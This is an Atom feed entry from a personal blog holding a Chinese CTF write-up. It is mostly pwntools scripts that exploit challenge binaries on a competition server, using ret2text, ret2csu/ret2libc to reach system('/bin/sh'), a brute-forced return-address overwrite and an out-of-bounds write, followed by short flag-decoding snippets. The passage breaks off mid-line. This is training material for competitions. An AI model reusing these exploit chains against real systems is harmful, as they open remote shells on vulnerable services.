<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>花开再美，怎如初见..?</title>
  
  
  <link href="https://wuming.github.io/atom.xml" rel="self"/>
  
  <link href="https://wuming.github.io/"/>
  <updated>2023-12-18T05:33:33.834Z</updated>
  <id>https://wuming.github.io/</id>
  
  <author>
    <name>wuming</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>奇怪的wp</title>
    <link href="https://wuming.github.io/2023/10/08/%E5%A5%87%E6%80%AA%E7%9A%84wp/"/>
    <id>https://wuming.github.io/2023/10/08/%E5%A5%87%E6%80%AA%E7%9A%84wp/</id>
    <published>2023-10-08T13:14:04.000Z</published>
    <updated>2023-12-18T05:33:33.834Z</updated>
    
    <content type="html"><![CDATA[<h4 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./ezshellcode&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">30213</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;my heart&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaSyclover&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;challege!&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">a=p.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">a = a[<span class="number">0</span>:-<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="number">6666666666</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">r = <span class="built_in">eval</span>(a)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(r))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>PIE手动爆破,填充数据不是0x50</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line"><span class="comment"># r = gdb.debug(&#x27;./ret2text&#x27;)</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./ret2text&#x27;)</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31949</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span class="line">elf = ELF(<span class="string">&#x27;ret2text&#x27;</span>)</span><br><span class="line">se      = <span class="keyword">lambda</span> data               :r.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :r.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :r.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :r.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :r.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">lic = <span class="keyword">lambda</span> data               :uu64(ru(data)[-<span class="number">6</span>:])</span><br><span class="line">padding = <span class="keyword">lambda</span> lenth              :<span class="string">b&#x27;Yhuan&#x27;</span>*(lenth//<span class="number">5</span>)+<span class="string">b&#x27;Y&#x27;</span>*(lenth % <span class="number">5</span>)</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :r.interactive()</span><br><span class="line"></span><br><span class="line">pad = p64(<span class="number">0</span>)*<span class="number">9</span> + p64(<span class="number">1</span>)</span><br><span class="line">backdoor = <span class="string">b&#x27;\x27\xA2&#x27;</span></span><br><span class="line"></span><br><span class="line">pl1 = pad + p64(<span class="number">0</span>) + backdoor</span><br><span class="line">se(pl1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><span id="more"></span> <h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>libcsearcher</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># sh = process(&#x27;./chal&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31971</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;../../tools/libc-database/db/libc6_2.23-0ubuntu10_amd64.so&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">gadgets1 = <span class="number">0x000000000040132A</span></span><br><span class="line">gadgets2 = <span class="number">0x0000000000401310</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">offset = <span class="string">b&#x27;\0&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">r12,r13,r14,r15,ret_addr</span>):</span><br><span class="line">    payload = offset</span><br><span class="line">    payload += p64(gadgets1)</span><br><span class="line">    <span class="comment"># payload += b&quot;\0&quot;*8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(r12)</span><br><span class="line">    payload += p64(r15)</span><br><span class="line">    payload += p64(r14)</span><br><span class="line">    payload += p64(r13)</span><br><span class="line">    payload += p64(gadgets2) </span><br><span class="line">    payload += <span class="string">b&quot;\0&quot;</span>*<span class="number">56</span></span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"><span class="comment"># sh.recvuntil(&quot;this\n&quot;)</span></span><br><span class="line">csu(<span class="number">1</span>,write_got,<span class="number">8</span>,write_got,main_addr)</span><br><span class="line">write_addr = u64(sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"><span class="comment"># offset_addr = write_addr - libc.symbols[&#x27;write&#x27;]</span></span><br><span class="line"><span class="comment"># success(&quot;offset_addr = 0x%x&quot;,offset_addr)</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment"># print(&quot;123&quot;+libc.dump(&#x27;str_bin_sh&#x27;))</span></span><br><span class="line"><span class="comment"># system_addr = offset_addr + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># print(&quot;execve:&quot;,hex(system_addr))</span></span><br><span class="line"><span class="comment"># binsh_address = next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="comment"># print(&quot;binsh:&quot;,hex(binsh_address))</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;this\n&quot;</span>)</span><br><span class="line">payload = offset</span><br><span class="line">payload+= p64(<span class="number">0x000000000040101a</span>)<span class="comment">#ret_addr</span></span><br><span class="line">payload+= p64(<span class="number">0x0000000000401333</span>)<span class="comment"># pop_rdi_ret</span></span><br><span class="line">payload+= p64(binsh)</span><br><span class="line">payload+= p64(system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>提供的libc做</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import*</span></span><br><span class="line"><span class="comment"># sh = process(&#x27;./chal&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31971</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;../../tools/libc-database/db/libc6_2.23-0ubuntu10_amd64.so&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">gadgets1 = <span class="number">0x000000000040132A</span></span><br><span class="line">gadgets2 = <span class="number">0x0000000000401310</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">offset = <span class="string">b&#x27;\0&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">r12,r13,r14,r15,ret_addr</span>):</span><br><span class="line">    payload = offset</span><br><span class="line">    payload += p64(gadgets1)</span><br><span class="line">    <span class="comment"># payload += b&quot;\0&quot;*8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(r12)</span><br><span class="line">    payload += p64(r15)</span><br><span class="line">    payload += p64(r14)</span><br><span class="line">    payload += p64(r13)</span><br><span class="line">    payload += p64(gadgets2) </span><br><span class="line">    payload += <span class="string">b&quot;\0&quot;</span>*<span class="number">56</span></span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"><span class="comment"># sh.recvuntil(&quot;this\n&quot;)</span></span><br><span class="line">csu(<span class="number">1</span>,write_got,<span class="number">8</span>,write_got,main_addr)</span><br><span class="line">write_addr = u64(sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">offset_addr = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;offset_addr = 0x%x&quot;</span>,offset_addr)</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;write&#x27;,write_addr)</span></span><br><span class="line"><span class="comment"># base = write_addr - libc.dump(&#x27;write&#x27;)</span></span><br><span class="line"><span class="comment"># system = base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment"># binsh = base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="comment"># print(&quot;123&quot;+libc.dump(&#x27;str_bin_sh&#x27;))</span></span><br><span class="line">system_addr = offset_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;execve:&quot;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line">binsh_address = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;binsh:&quot;</span>,<span class="built_in">hex</span>(binsh_address))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;this\n&quot;</span>)</span><br><span class="line">payload = offset</span><br><span class="line">payload+= p64(<span class="number">0x000000000040101a</span>)<span class="comment">#ret_addr</span></span><br><span class="line">payload+= p64(<span class="number">0x0000000000401333</span>)<span class="comment"># pop_rdi_ret</span></span><br><span class="line">payload+= p64(offset_addr+binsh_address)</span><br><span class="line">payload+= p64(system_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./password&#x27;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./password&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31300</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># res = b&#x27;wrong&#x27;</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31300</span>)</span><br><span class="line">    <span class="comment"># p = process(&#x27;./password&#x27;)</span></span><br><span class="line">    pad = <span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">    backdoor = p64(<span class="number">0x4012F3</span>)</span><br><span class="line">    pl1 = pad + backdoor</span><br><span class="line">    p.send(pl1)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;password:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    res = p.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Correct&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># res = b&#x27;wrong&#x27;</span></span><br><span class="line"><span class="comment"># while b&#x27;wrong&#x27; in res:</span></span><br><span class="line"><span class="comment">#     p = process(&#x27;./password&#x27;)</span></span><br><span class="line"><span class="comment">#     pad = b&#x27;a&#x27;*0x20</span></span><br><span class="line"><span class="comment">#     backdoor = p64(0x4012F3)</span></span><br><span class="line"><span class="comment">#     pl1 = pad + backdoor</span></span><br><span class="line"><span class="comment">#     p.sendline(pl1)</span></span><br><span class="line"><span class="comment">#     p.recvuntil(&#x27;password:&#x27;)</span></span><br><span class="line"><span class="comment">#     p.sendline(b&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#     res = p.recvall()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="write1"><a href="#write1" class="headerlink" title="write1"></a>write1</h2><p>[<a href="https://blog.csdn.net/mcmuyanga/article/details/114673240">BUUCTF]PWN——wustctf2020_name_your_cat（数组越界）_pwn ctf 越界写-CSDN博客</a></p><p>这个题目和我们做的才差不多，都是通过数据越界然后修改地址，但要注意数组是一个字节一个字节的，这个题目是8个字节8个字节的，所以可以直接使用p64(地址)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(v2 + v1) += tmp;</span><br></pre></td></tr></table></figure><p>这个关键的语句，不是&#x3D;，所以不是覆盖，我们要输入数值，然后让这个地址加减数值，让他等于我们的返回地址</p><p>我们gdb动调一下，可以看到我们输入下表位41，然后值为-1的时候，他的返回地址从40134D变成了40124D，这就是我们这个的目的，我们要把他变成我们的返回地址</p><p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231029221238038.png" alt="image-20231029221238038"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;chal&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31277</span>)</span><br><span class="line"><span class="comment"># p=gdb.debug(&#x27;./chal&#x27;)</span></span><br><span class="line"><span class="comment"># p=remote(&quot;node3.buuoj.cn&quot;,28477)</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./wustctf2020_name_your_cat&#x27;)</span></span><br><span class="line"><span class="comment"># elf=ELF(&#x27;./wustctf2020_name_your_cat&#x27;)</span></span><br><span class="line"></span><br><span class="line">shell_addr=<span class="number">0x401221</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;aaaaaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="string">b&#x27;41&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;value:&quot;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;value:&quot;</span>,<span class="string">b&#x27;-2b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&quot;</span></span><br><span class="line">a=<span class="built_in">list</span>(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i])-<span class="number">7</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="砍树"><a href="#砍树" class="headerlink" title="砍树"></a>砍树</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">enc =[</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x17</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>, <span class="number">0x0E</span>, <span class="number">0x36</span>, <span class="number">0x26</span>, <span class="number">0x17</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x2A</span>, <span class="number">0x29</span>, <span class="number">0x07</span>, <span class="number">0x26</span>, <span class="number">0x15</span>, <span class="number">0x52</span>, <span class="number">0x33</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, </span><br><span class="line">  <span class="number">0x3A</span>, <span class="number">0x27</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x33</span>, <span class="number">0x07</span>, <span class="number">0x46</span>, <span class="number">0x17</span>, <span class="number">0x3D</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x3C</span>, <span class="number">0x38</span>, <span class="number">0x2E</span>, <span class="number">0x22</span>, <span class="number">0x18</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;Sycloverforerver&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    enc[i]=enc[i]^<span class="built_in">ord</span>(key[i%<span class="built_in">len</span>(key)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(enc[i])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(0x1B^ord(&#x27;&#123;&#x27;))</span></span><br></pre></td></tr></table></figure><h2 id="听说cpp很难？"><a href="#听说cpp很难？" class="headerlink" title="听说cpp很难？"></a>听说cpp很难？</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">77</span>, <span class="number">95</span>, <span class="number">61</span>, <span class="number">55</span>, <span class="number">104</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">39</span>, <span class="number">104</span>, <span class="number">81</span>, <span class="number">89</span>, <span class="number">127</span>, <span class="number">38</span>, <span class="number">107</span>, <span class="number">89</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">85</span>, <span class="number">91</span>, <span class="number">89</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">79</span>, <span class="number">87</span>, <span class="number">120</span>, <span class="number">120</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i]=((a[i]+<span class="number">10</span>)^<span class="number">10</span>)-<span class="number">10</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print((71^ 